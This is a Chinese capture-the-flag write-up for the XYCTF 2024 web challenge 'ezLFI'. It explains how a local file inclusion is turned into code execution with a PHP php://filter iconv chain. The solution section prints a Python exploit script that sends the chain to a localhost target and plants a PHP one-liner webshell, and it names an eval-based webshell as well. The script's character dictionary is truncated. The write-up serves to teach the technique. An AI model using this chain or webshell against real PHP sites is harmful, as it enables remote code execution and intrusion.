# ezLFI

> 分类：Web

## 题目描述
本地文件包含题。源码就是 LFI（`include_once`）。Dockerfile 中 `chmod 400 /flag` 设置 flag 只有所有者可读，存在 `/readflag` 说明需要执行 shell 命令。需要利用 php filter chain 构造一句话木马 getshell 后执行 `/readflag`。

## 考察知识点
- 本地文件包含（LFI）
- php://filter 编码链构造任意字符（PHP_INCLUDE_TO_SHELL_CHAR_DICT）
- 文件权限 chmod 400 与 /readflag

## 解法
用 [PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT) 项目构造一句话木马 `<?php eval($_GET[1]);?>` 的 filter chain，再通过 GET 参数执行 `/readflag`。

参考脚本（改编自该项目）：
```python
import requests

url = "http://localhost:49819/?file="
file_to_use = "/etc/passwd"
command = "/readflag"

# <?=`$_GET[0]`;;?>
base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    # ...（完整字典见 PHP_INCLUDE_TO_SHELL_CHAR_DICT 项目）
}

filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
filters += "convert.iconv.UTF8.UTF7|"

for c in base64_payload[::-1]:
    filters += conversions[c] + "|"
    filters += "convert.base64-decode|"
    filters += "convert.base64-encode|"
    filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

r = requests.get(url, params={"0": command, "action": "include", "file": final_payload})
print(r.text)
```

注意：如果服务器无响应，说明生成的 filter chain 中有靶机系统不支持的字符集，换一个项目生成（本机用 PHP_INCLUDE_TO_SHELL_CHAR_DICT）。

## 参考答案
（未给出，见截图）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
